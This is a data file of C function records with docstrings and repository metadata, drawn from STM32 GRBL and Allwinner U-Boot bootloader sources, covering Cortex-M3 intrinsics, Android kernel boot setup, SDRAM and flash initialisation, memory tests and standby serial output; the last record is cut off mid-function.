{"docstring": "/**\n * @brief  STR Exclusive\n *\n * @param  uint16_t *address\n * @param  uint16_t value to store\n * @return uint32_t successful / failed\n *\n * Exclusive STR command\n */\n", "func_signal": "uint32_t __STREXH(uint16_t value, uint16_t *addr)", "code": "{\n  __ASM(\"strexh r0, r0, [r1]\");\n  __ASM(\"bx lr\");\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Reverse byte order in unsigned short value\n *\n * @param  uint16_t value to reverse\n * @return uint32_t reversed value\n *\n * Reverse byte order in unsigned short value\n */\n", "func_signal": "uint32_t __REV16(uint16_t value)", "code": "{\n  uint32_t result=0;\n  \n  __ASM volatile (\"rev16 %0, %1\" : \"=r\" (result) : \"r\" (value) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Reverse byte order in signed short value with sign extension to integer\n *\n * @param  int16_t value to reverse\n * @return int32_t reversed value\n *\n * Reverse byte order in signed short value with sign extension to integer\n */\n", "func_signal": "__ASM int32_t __REVSH(int16_t value)", "code": "{\n  revsh r0, r0\n  bx lr\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Return the Process Stack Pointer\n *\n * @param  none\n * @return uint32_t ProcessStackPointer\n *\n * Return the actual process stack pointer\n */\n", "func_signal": "uint32_t __get_PSP(void)", "code": "{\n  uint32_t result=0;\n\n  __ASM volatile (\"MRS %0, psp\" : \"=r\" (result) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/*********************************\u0368\u053f*****************************************************/\n", "func_signal": "void Change_TIM8_OC1_Polarity(u8 i)", "code": "{\n     if(i==1)TIM8_OCInitStructure.TIM_OCPolarity = TIM_OCPolarity_High;\n\t else \t TIM8_OCInitStructure.TIM_OCPolarity = TIM_OCPolarity_Low;\n\t TIM_OC1Init(TIM8,&TIM8_OCInitStructure);\n}", "path": "user\\pwm\\pwm.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Set the Priority Mask value\n *\n * @param  uint32_t PriMask\n * @return none\n *\n * Set the priority mask bit in the priority mask register\n */\n", "func_signal": "__ASM void __set_PRIMASK(uint32_t priMask)", "code": "{\n  msr primask, r0\n  bx lr\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/* Boot android style linux kernel and ramdisk */\n", "func_signal": "int do_boota_linux (struct fastboot_boot_img_hdr *hdr)", "code": "{\n\tulong initrd_start, initrd_end;\n\tvoid (*kernel_entry)(int zero, int arch, uint params);\n\tbd_t *bd = gd->bd;\n\n\tdebug(\"do_boota_linux storage_type = %d\\n\", uboot_spare_head.boot_data.storage_type);\n\n\tkernel_entry = (void (*)(int, int, uint))(hdr->kernel_addr);\n\n#ifdef CONFIG_CMDLINE_TAG\n\tchar *commandline = getenv (\"bootargs\");\n#endif\n\n\tinitrd_start = hdr->ramdisk_addr;\n\tinitrd_end = initrd_start + hdr->ramdisk_size;\n#if defined (CONFIG_SETUP_MEMORY_TAGS) || \\\n    defined (CONFIG_CMDLINE_TAG) || \\\n    defined (CONFIG_INITRD_TAG) || \\\n    defined (CONFIG_SERIAL_TAG) || \\\n    defined (CONFIG_REVISION_TAG)\n\tsetup_start_tag (bd);\n#ifdef CONFIG_SERIAL_TAG\n\tsetup_serial_tag (&params);\n#endif\n#ifdef CONFIG_REVISION_TAG\n\tsetup_revision_tag (&params);\n#endif\n#ifdef CONFIG_SETUP_MEMORY_TAGS\n\tsetup_memory_tags (bd);\n#endif\n#ifdef CONFIG_CMDLINE_TAG\n\tif(strlen((const char *)hdr->cmdline)) {\n\t\tchar *s = getenv(\"partitions\");\n\t\tchar *sig = getenv(\"signature\");\n\t\tchar data[16] = {0};\n\n\t\tmemset(data, 0, 16);\n\n        strcat((char *)hdr->cmdline, \" boot_type=\");\n        sprintf(data, \"%d\", uboot_spare_head.boot_data.storage_type);\n        strcat((char *)hdr->cmdline, data);\n\n        strcat((char *)hdr->cmdline, \" disp_para=\");\n        board_display_setenv(data);\n        strcat((char *)hdr->cmdline, data);\n\n\t\tif(sig != NULL)\n\t\t{\n\t\t\tstrcat((char *)hdr->cmdline, \" signature=\");\n\t\t\tstrcat((char *)hdr->cmdline, sig);\n        }\n\t\tif(gd->chargemode == 1)\n\t\t{\n\t\t\tstrcat((char *)hdr->cmdline, \" androidboot.mode=\");\n\t\t\tstrcat((char *)hdr->cmdline, \"charger\");\n\t\t}\n\n        strcat((char *)hdr->cmdline, \" config_size=\");\n        sprintf(data, \"%d\", script_get_length());\n        strcat((char *)hdr->cmdline, data);\n\n\t\tstrcat((char *)hdr->cmdline, \" partitions=\");\n        strcat((char *)hdr->cmdline, s);\n\n\t\tsetup_commandline_tag (bd, (char *)hdr->cmdline);\n\t} else {\n\n\t//\tchar *s = getenv(\"partitions\");\n\t\tchar *sig = getenv(\"signature\");\n\t\tchar cmdline[FASTBOOT_BOOT_ARGS_SIZE];\n\t\tchar data[16] = {0};\n\n\t\tmemset(cmdline, 0, FASTBOOT_BOOT_ARGS_SIZE);\n\t\tmemset(data, 0, 16);\n\n\t\tstrcpy(cmdline, commandline);\n\n\t\tstrcat(cmdline, \" boot_type=\");\n        sprintf(data, \"%d\", uboot_spare_head.boot_data.storage_type);\n        strcat(cmdline, data);\n\n        strcat(cmdline, \" disp_para=\");\n        board_display_setenv(data);\n        strcat(cmdline, data);\n\n\t\tif(gd->chargemode == 1)\n\t\t{\n\t\t    strcat(cmdline,\" androidboot.mode=\");\n\t\t    strcat(cmdline,\"charger\");\n\t\t}\n\n        strcat((char *)cmdline, \" config_size=\");\n        sprintf(data, \"%d\", script_get_length());\n        strcat((char *)cmdline, data);\n\n\t\tif(sig != NULL)\n\t\t{\tstrcat(cmdline, \" signature=\");\n\t\t\tstrcat(cmdline, sig);\n        }\n\n\t//\tstrcat(cmdline, \" partitions=\");\n        //strcat(cmdline, s);\n\t\tsetup_commandline_tag (bd, cmdline);\n\t}\n#endif\n#ifdef CONFIG_INITRD_TAG\n\tif (hdr->ramdisk_size)\n\t\tsetup_initrd_tag (bd, initrd_start, initrd_end);\n#endif\n#if defined (CONFIG_VFD) || defined (CONFIG_LCD)\n\tsetup_videolfb_tag ((gd_t *) gd);\n#endif\n\tsetup_end_tag (bd);\n#endif\n\t/* we assume that the kernel is in place */\n\tannounce_and_cleanup();\n\n\tkernel_entry(0, bd->bi_arch_number, bd->bi_boot_params);\n\t/* does not return */\n\n\treturn 1;\n}", "path": "u-boot-2011.09\\arch\\arm\\lib\\bootm.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/* CONFIG_SETUP_MEMORY_TAGS */\n", "func_signal": "static void setup_commandline_tag (bd_t *bd, char *commandline)", "code": "{\n\tchar *p;\n\n\tif (!commandline)\n\t\treturn;\n\n\t/* eat leading white space */\n\tfor (p = commandline; *p == ' '; p++);\n\n\t/* skip non-existent command lines so the kernel will still\n\t * use its default command line.\n\t */\n\tif (*p == '\\0')\n\t\treturn;\n\n\tparams->hdr.tag = ATAG_CMDLINE;\n\tparams->hdr.size =\n\t\t(sizeof (struct tag_header) + strlen (p) + 1 + 4) >> 2;\n\n\tstrcpy (params->u.cmdline.cmdline, p);\n\n\tparams = tag_next (params);\n}", "path": "u-boot-2011.09\\arch\\arm\\lib\\bootm.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*!CONFIG_SYS_SPD_EEPROM*/\n", "func_signal": "int checkboard (void)", "code": "{\n\t/*\n\t * Warning: do not read the BCSR registers here\n\t *\n\t * There is a timing bug in the 8349E and 8349EA BCSR code\n\t * version 1.2 (read from BCSR 11) that will cause the CFI\n\t * flash initialization code to overwrite BCSR 0, disabling\n\t * the serial ports and gigabit ethernet\n\t */\n\n\tputs(\"Board: Freescale MPC8349EMDS\\n\");\n\treturn 0;\n}", "path": "u-boot-2011.09\\board\\freescale\\mpc8349emds\\mpc8349emds.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/* CONFIG_SETUP_MEMORY_TAGS || CONFIG_CMDLINE_TAG || CONFIG_INITRD_TAG */\n", "func_signal": "static ulong get_sp(void)", "code": "{\n\tulong ret;\n\n\tasm(\"mov %0, sp\" : \"=r\"(ret) : );\n\treturn ret;\n}", "path": "u-boot-2011.09\\arch\\arm\\lib\\bootm.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/* Configure and enable Switch and PHY */\n", "func_signal": "void reset_phy(void)", "code": "{\n\t/* configure and initialize switch */\n\tstruct mv88e61xx_config swcfg = {\n\t\t.name = \"egiga0\",\n\t\t.vlancfg = MV88E61XX_VLANCFG_ROUTER,\n\t\t.rgmii_delay = MV88E61XX_RGMII_DELAY_EN,\n\t\t.led_init = MV88E61XX_LED_INIT_EN,\n\t\t.portstate = MV88E61XX_PORTSTT_FORWARDING,\n\t\t.cpuport = (1 << 5),\n\t\t.ports_enabled = 0x3f,\n\t};\n\n\tmv88e61xx_switch_initialize(&swcfg);\n\n\t/* configure and initialize PHY */\n\tmv_phy_88e1116_init(\"egiga1\");\n}", "path": "u-boot-2011.09\\board\\Marvell\\rd6281a\\rd6281a.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/* CONFIG_REVISION_TAG */\n", "func_signal": "static void setup_end_tag (bd_t *bd)", "code": "{\n\tparams->hdr.tag = ATAG_NONE;\n\tparams->hdr.size = 0;\n}", "path": "u-boot-2011.09\\arch\\arm\\lib\\bootm.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*************************************************************************\n *  fixed sdram init -- doesn't use serial presence detect.\n ************************************************************************/\n", "func_signal": "int fixed_sdram(void)", "code": "{\n\tvolatile immap_t *im = (immap_t *)CONFIG_SYS_IMMR;\n\tu32 msize = 0;\n\tu32 ddr_size;\n\tu32 ddr_size_log2;\n\n\tmsize = CONFIG_SYS_DDR_SIZE;\n\tfor (ddr_size = msize << 20, ddr_size_log2 = 0;\n\t     (ddr_size > 1);\n\t     ddr_size = ddr_size>>1, ddr_size_log2++) {\n\t\tif (ddr_size & 1) {\n\t\t\treturn -1;\n\t\t}\n\t}\n\tim->sysconf.ddrlaw[0].bar = CONFIG_SYS_DDR_SDRAM_BASE & 0xfffff000;\n\tim->sysconf.ddrlaw[0].ar = LAWAR_EN | ((ddr_size_log2 - 1) & LAWAR_SIZE);\n\n#if (CONFIG_SYS_DDR_SIZE != 256)\n#warning Currenly any ddr size other than 256 is not supported\n#endif\n#ifdef CONFIG_DDR_II\n\tim->ddr.csbnds[2].csbnds = CONFIG_SYS_DDR_CS2_BNDS;\n\tim->ddr.cs_config[2] = CONFIG_SYS_DDR_CS2_CONFIG;\n\tim->ddr.timing_cfg_0 = CONFIG_SYS_DDR_TIMING_0;\n\tim->ddr.timing_cfg_1 = CONFIG_SYS_DDR_TIMING_1;\n\tim->ddr.timing_cfg_2 = CONFIG_SYS_DDR_TIMING_2;\n\tim->ddr.timing_cfg_3 = CONFIG_SYS_DDR_TIMING_3;\n\tim->ddr.sdram_cfg = CONFIG_SYS_DDR_SDRAM_CFG;\n\tim->ddr.sdram_cfg2 = CONFIG_SYS_DDR_SDRAM_CFG2;\n\tim->ddr.sdram_mode = CONFIG_SYS_DDR_MODE;\n\tim->ddr.sdram_mode2 = CONFIG_SYS_DDR_MODE2;\n\tim->ddr.sdram_interval = CONFIG_SYS_DDR_INTERVAL;\n\tim->ddr.sdram_clk_cntl = CONFIG_SYS_DDR_CLK_CNTL;\n#else\n\tim->ddr.csbnds[2].csbnds = 0x0000000f;\n\tim->ddr.cs_config[2] = CONFIG_SYS_DDR_CONFIG;\n\n\t/* currently we use only one CS, so disable the other banks */\n\tim->ddr.cs_config[0] = 0;\n\tim->ddr.cs_config[1] = 0;\n\tim->ddr.cs_config[3] = 0;\n\n\tim->ddr.timing_cfg_1 = CONFIG_SYS_DDR_TIMING_1;\n\tim->ddr.timing_cfg_2 = CONFIG_SYS_DDR_TIMING_2;\n\n\tim->ddr.sdram_cfg =\n\t\tSDRAM_CFG_SREN\n#if defined(CONFIG_DDR_2T_TIMING)\n\t\t| SDRAM_CFG_2T_EN\n#endif\n\t\t| 2 << SDRAM_CFG_SDRAM_TYPE_SHIFT;\n#if defined (CONFIG_DDR_32BIT)\n\t/* for 32-bit mode burst length is 8 */\n\tim->ddr.sdram_cfg |= (SDRAM_CFG_32_BE | SDRAM_CFG_8_BE);\n#endif\n\tim->ddr.sdram_mode = CONFIG_SYS_DDR_MODE;\n\n\tim->ddr.sdram_interval = CONFIG_SYS_DDR_INTERVAL;\n#endif\n\tudelay(200);\n\n\t/* enable DDR controller */\n\tim->ddr.sdram_cfg |= SDRAM_CFG_MEM_EN;\n\treturn msize;\n}", "path": "u-boot-2011.09\\board\\freescale\\mpc8349emds\\mpc8349emds.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*********************************************************************/\n/* NAME:  mem_test_address() -\ttest address lines\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* DESCRIPTION:\t\t\t\t\t\t\t     */\n/*   This function performs a test to verify that each word im\t     */\n/*   memory is uniquly addressable. The test sequence is as follows: */\n/*\t\t\t\t\t\t\t\t     */\n/*   1) write the address of each word to each word.\t\t     */\n/*   2) verify that each location equals its address\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* OUTPUTS:\t\t\t\t\t\t\t     */\n/*   Displays failing test pattern and address\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RETURNS:\t\t\t\t\t\t\t     */\n/*   0 -  Passed test\t\t\t\t\t\t     */\n/*   1 -  Failed test\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RESTRICTIONS/LIMITATIONS:\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*********************************************************************/\n", "func_signal": "int mem_test_address (void)", "code": "{\n\tvolatile unsigned int *pmem =\n\t\t(volatile unsigned int *) CONFIG_SYS_SDRAM_BASE;\n\tconst unsigned int size = (CONFIG_SYS_SDRAM_SIZE * 1024 * 1024) / 4;\n\tunsigned int i;\n\n\t/* write address to each location */\n\tfor (i = 0; i < size; i++) {\n\t\tpmem[i] = i;\n\t}\n\n\t/* verify each loaction */\n\tfor (i = 0; i < size; i++) {\n\t\tif (pmem[i] != i) {\n\t\t\tprintf (\"\\n   Address Test Failed at 0x%x\", i);\n\t\t\treturn 1;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "u-boot-2011.09\\board\\gw8260\\gw8260.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*-----------------------------------------------------------------------\n */\n", "func_signal": "unsigned long flash_init (void)", "code": "{\n\tunsigned long size_b0;\n\tint i;\n\tuint pbcr;\n\tunsigned long base_b0;\n\tint size_val = 0;\n\n\t/* Init: no FLASHes known */\n\tfor (i=0; i<CONFIG_SYS_MAX_FLASH_BANKS; ++i) {\n\t\tflash_info[i].flash_id = FLASH_UNKNOWN;\n\t}\n\n\t/* Static FLASH Bank configuration here - FIXME XXX */\n\n\tsize_b0 = flash_get_size((vu_long *)FLASH_BASE0_PRELIM, &flash_info[0]);\n\n\tif (flash_info[0].flash_id == FLASH_UNKNOWN) {\n\t\tprintf (\"## Unknown FLASH on Bank 0 - Size = 0x%08lx = %ld MB\\n\",\n\t\t\tsize_b0, size_b0<<20);\n\t}\n\n\t/* Setup offsets */\n\tflash_get_offsets (-size_b0, &flash_info[0]);\n\n\t/* Re-do sizing to get full correct info */\n\tmtdcr(EBC0_CFGADDR, PB0CR);\n\tpbcr = mfdcr(EBC0_CFGDATA);\n\tmtdcr(EBC0_CFGADDR, PB0CR);\n\tbase_b0 = -size_b0;\n\tswitch (size_b0) {\n\tcase 1 << 20:\n\t\tsize_val = 0;\n\t\tbreak;\n\tcase 2 << 20:\n\t\tsize_val = 1;\n\t\tbreak;\n\tcase 4 << 20:\n\t\tsize_val = 2;\n\t\tbreak;\n\tcase 8 << 20:\n\t\tsize_val = 3;\n\t\tbreak;\n\tcase 16 << 20:\n\t\tsize_val = 4;\n\t\tbreak;\n\t}\n\tpbcr = (pbcr & 0x0001ffff) | base_b0 | (size_val << 17);\n\tmtdcr(EBC0_CFGDATA, pbcr);\n\n\t/* Monitor protection ON by default */\n\t(void)flash_protect(FLAG_PROTECT_SET,\n\t\t\t    -CONFIG_SYS_MONITOR_LEN,\n\t\t\t    0xffffffff,\n\t\t\t    &flash_info[0]);\n\n\tflash_info[0].size = size_b0;\n\n\treturn (size_b0);\n}", "path": "u-boot-2011.09\\board\\esd\\hh405\\flash.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\n************************************************************************************************************\n*\n*                                             function\n*\n*    \u01a3\n*\n*    \u0431\n*\n*    \u05b5  \n*\n*    \u02f5    \n*\n*\n************************************************************************************************************\n*/\n", "func_signal": "void standby_int_to_string_hex( int input, char * str )", "code": "{\n\tint i;\n\tstatic char base[] = \"0123456789abcdef\";\n\n\tfor( i = 9; i > 1; --i )\n\t{\n\t\tstr[i] = base[input&0x0f];\n\t\tinput >>= 4;\n\t}\n\n\tstr[0] = '0';\n\tstr[1] = 'x';                         // Hex format shoud start with \"0x\" or \"0X\".\n\tstr[10] = '\\0';                       // 'str' must end with '\\0'\n\n\treturn;\n}", "path": "u-boot-2011.09\\board\\sunxi\\sun8iw7\\standby\\standby_serial.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*********************************************************************/\n/* NAME: checkboard() -\t Displays the board type and serial number   */\n/*\t\t\t\t\t\t\t\t     */\n/* OUTPUTS:\t\t\t\t\t\t\t     */\n/*   Displays the board type and serial number\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RETURNS:\t\t\t\t\t\t\t     */\n/*   Always returns 1\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RESTRICTIONS/LIMITATIONS:\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*********************************************************************/\n", "func_signal": "int checkboard (void)", "code": "{\n\tchar buf[64];\n\tint i = getenv_f(\"serial#\", buf, sizeof(buf));\n\n\tputs (\"Board: Advent Networks gw8260\\n\");\n\n\tif (i > 0) {\n\t\tprintf(\"SN:    %s\\n\", buf);\n\t}\n\treturn 0;\n}", "path": "u-boot-2011.09\\board\\gw8260\\gw8260.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*********************************************************************/\n/* NAME: initdram() -  initializes SDRAM controller\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* DESCRIPTION:\t\t\t\t\t\t\t     */\n/*   Initializes the MPC8260's SDRAM controller.\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* INPUTS:\t\t\t\t\t\t\t     */\n/*   CONFIG_SYS_IMMR\t    -  MPC8260 Internal memory map\t\t     */\n/*   CONFIG_SYS_SDRAM_BASE -  Physical start address of SDRAM\t\t     */\n/*   CONFIG_SYS_PSDMR -       SDRAM mode register\t\t\t     */\n/*   CONFIG_SYS_MPTPR -       Memory refresh timer prescaler register\t     */\n/*   CONFIG_SYS_SDRAM0_SIZE - SDRAM size\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RETURNS:\t\t\t\t\t\t\t     */\n/*   SDRAM size in bytes\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RESTRICTIONS/LIMITATIONS:\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*********************************************************************/\n", "func_signal": "phys_size_t initdram (int board_type)", "code": "{\n\tvolatile immap_t *immap = (immap_t *) CONFIG_SYS_IMMR;\n\tvolatile memctl8260_t *memctl = &immap->im_memctl;\n\tvolatile uchar c = 0, *ramaddr = (uchar *) (CONFIG_SYS_SDRAM_BASE + 0x8);\n\tulong psdmr = CONFIG_SYS_PSDMR;\n\tint i;\n\n\t/*\n\t * Quote from 8260 UM (10.4.2 SDRAM Power-On Initialization, 10-35):\n\t *\n\t * \"At system reset, initialization software must set up the\n\t *  programmable parameters in the memory controller banks registers\n\t *  (ORx, BRx, P/LSDMR). After all memory parameters are configured,\n\t *  system software should execute the following initialization sequence\n\t *  for each SDRAM device.\n\t *\n\t *  1. Issue a PRECHARGE-ALL-BANKS command\n\t *  2. Issue eight CBR REFRESH commands\n\t *  3. Issue a MODE-SET command to initialize the mode register\n\t *\n\t *  The initial commands are executed by setting P/LSDMR[OP] and\n\t *  accessing the SDRAM with a single-byte transaction.\"\n\t *\n\t * The appropriate BRx/ORx registers have already been set when we\n\t * get here. The SDRAM can be accessed at the address CONFIG_SYS_SDRAM_BASE.\n\t */\n\n\tmemctl->memc_psrt = CONFIG_SYS_PSRT;\n\tmemctl->memc_mptpr = CONFIG_SYS_MPTPR;\n\n\tmemctl->memc_psdmr = psdmr | PSDMR_OP_PREA;\n\t*ramaddr = c;\n\n\tmemctl->memc_psdmr = psdmr | PSDMR_OP_CBRR;\n\tfor (i = 0; i < 8; i++) {\n\t\t*ramaddr = c;\n\t}\n\tmemctl->memc_psdmr = psdmr | PSDMR_OP_MRW;\n\t*ramaddr = c;\n\n\tmemctl->memc_psdmr = psdmr | PSDMR_OP_NORM | PSDMR_RFEN;\n\t*ramaddr = c;\n\n\t/* return total ram size */\n\treturn (CONFIG_SYS_SDRAM0_SIZE * 1024 * 1024);\n}", "path": "u-boot-2011.09\\board\\gw8260\\gw8260.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\n * Initialize SDRAM memory on the Local Bus.\n */\n", "func_signal": "void sdram_init(void)", "code": "{\n\tvolatile immap_t *immap = (immap_t *)CONFIG_SYS_IMMR;\n\tvolatile fsl_lbc_t *lbc = &immap->im_lbc;\n\tuint *sdram_addr = (uint *)CONFIG_SYS_LBC_SDRAM_BASE;\n\n\t/*\n\t * Setup SDRAM Base and Option Registers, already done in cpu_init.c\n\t */\n\n\t/* setup mtrpt, lsrt and lbcr for LB bus */\n\tlbc->lbcr = CONFIG_SYS_LBC_LBCR;\n\tlbc->mrtpr = CONFIG_SYS_LBC_MRTPR;\n\tlbc->lsrt = CONFIG_SYS_LBC_LSRT;\n\tasm(\"sync\");\n\n\t/*\n\t * Configure the SDRAM controller Machine Mode Register.\n\t */\n\tlbc->lsdmr = CONFIG_SYS_LBC_LSDMR_5; /* 0x40636733; normal operation */\n\n\tlbc->lsdmr = CONFIG_SYS_LBC_LSDMR_1; /* 0x68636733; precharge all the banks */\n\tasm(\"sync\");\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\n\tlbc->lsdmr = CONFIG_SYS_LBC_LSDMR_2; /* 0x48636733; auto refresh */\n\tasm(\"sync\");\n\t/*1 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*2 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*3 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*4 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*5 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*6 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*7 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\t/*8 times*/\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\n\t/* 0x58636733; mode register write operation */\n\tlbc->lsdmr = CONFIG_SYS_LBC_LSDMR_4;\n\tasm(\"sync\");\n\t*sdram_addr = 0xff;\n\tudelay(100);\n\n\tlbc->lsdmr = CONFIG_SYS_LBC_LSDMR_5; /* 0x40636733; normal operation */\n\tasm(\"sync\");\n\t*sdram_addr = 0xff;\n\tudelay(100);\n}", "path": "u-boot-2011.09\\board\\freescale\\mpc8349emds\\mpc8349emds.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\n************************************************************************************************************\n*\n*                                             function\n*\n*    \u01a3\n*\n*    \u0431\n*\n*    \u05b5  \n*\n*    \u02f5    \n*\n*\n************************************************************************************************************\n*/\n", "func_signal": "void standby_int_to_string_dec( int input , char * str)", "code": "{\n\tchar stack[16];\n\tint sign_flag = 0 ;\n\tint i ;\n\tint j ;\n\n\tif( input == 0 )\n\t{\n\t\tstr[0] = '0';\n\t\tstr[1] = '\\0';                   // 'str' must end with '\\0'\n\t\treturn ;\n\t}\n\n\tif( input < 0 )                      // If 'input' is negative, 'input' is assigned to its absolute value.\n\t{\n\t\tsign_flag = -1 ;\n\t\tinput = -input ;\n\t}\n\n\tfor( i = 0; input > 0; ++i )\n\t{\n\t\tstack[i] = input%10 + '0';      // characters in reverse order are put in 'stack' .\n\t\tinput /= 10;\n\t}                                   // at the end of 'for' loop, 'i' is the number of characters.\n\n    j = 0;\n\tif( sign_flag == -1 )\n\t\tstr[j++] = '-';\t\t            // If 'input' is negative, minus sign '-' is placed in the head.\n\tfor( --i  ; i >= 0; --i, ++j )\n\t\tstr[j] = stack[i];\n\tstr[j] = '\\0';\t\t\t\t        // 'str' must end with '\\0'\n\n\n\treturn;\n}", "path": "u-boot-2011.09\\board\\sunxi\\sun8iw7\\standby\\standby_serial.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\n************************************************************************************************************\n*\n*                                             function\n*\n*    \u01a3\n*\n*    \u0431\n*\n*    \u05b5  \n*\n*    \u02f5    \n*\n*\n************************************************************************************************************\n*/\n", "func_signal": "void standby_serial_putc(char c)", "code": "{\n\t__u32 reg_val;\n\n\tdo\n\t{\n\t\treg_val = *(volatile unsigned int *)(0x01c2807C);\n\t}\twhile (!(reg_val & 0x02));\n\n\t*(volatile unsigned int *)(0x01c28000) = c;\n}", "path": "u-boot-2011.09\\board\\sunxi\\sun8iw7\\standby\\standby_serial.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\n************************************************************************************************************\n*\n*                                             function\n*\n*    \u01a3\n*\n*    \u0431\n*\n*    \u05b5  \n*\n*    \u02f5    \n*\n*\n************************************************************************************************************\n*/\n", "func_signal": "static void standby_serial_puts( const char * str )", "code": "{\n\twhile( *str != '\\0' )\n\t{\n\t\tif( *str == '\\n' )                      // if current character is '\\n', insert and output '\\r'\n\t\t\tstandby_serial_putc( '\\r' );\n\n\t\tstandby_serial_putc( *str++ );\n\t}\n}", "path": "u-boot-2011.09\\board\\sunxi\\sun8iw7\\standby\\standby_serial.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*     0xaaaaaaaaaaaaaaaa\t\t\t\t\t     */\n/*     0xcccccccccccccccc\t\t\t\t\t     */\n/*     0xf0f0f0f0f0f0f0f0\t\t\t\t\t     */\n/*     0xff00ff00ff00ff00\t\t\t\t\t     */\n/*     0xffff0000ffff0000\t\t\t\t\t     */\n/*     0xffffffff00000000\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*   The number test patterns will always be given by:\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*   log(base 2)(number data bits) = log2 (64) = 6\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*   To test for short and opens to other signals on our boards. we  */\n/*   simply\t\t\t\t\t\t\t     */\n/*   test with the 1's complemnt of the paterns as well.\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* OUTPUTS:\t\t\t\t\t\t\t     */\n/*   Displays failing test pattern\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RETURNS:\t\t\t\t\t\t\t     */\n/*   0 -  Passed test\t\t\t\t\t\t     */\n/*   1 -  Failed test\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RESTRICTIONS/LIMITATIONS:\t\t\t\t\t     */\n/*  Assumes only one one SDRAM bank\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*********************************************************************/\n", "func_signal": "int mem_test_data (void)", "code": "{\n\tunsigned long long *pmem = (unsigned long long *) CONFIG_SYS_SDRAM_BASE;\n\tunsigned long long temp64 = 0;\n\tint num_patterns = sizeof (pattern) / sizeof (pattern[0]);\n\tint i;\n\tunsigned int hi, lo;\n\n\tfor (i = 0; i < num_patterns; i++) {\n\t\tmove64 (&(pattern[i]), pmem);\n\t\tmove64 (pmem, &temp64);\n\n\t\t/* hi = (temp64>>32) & 0xffffffff;          */\n\t\t/* lo = temp64 & 0xffffffff;                */\n\t\t/* printf(\"\\ntemp64 = 0x%08x%08x\", hi, lo); */\n\n\t\thi = (pattern[i] >> 32) & 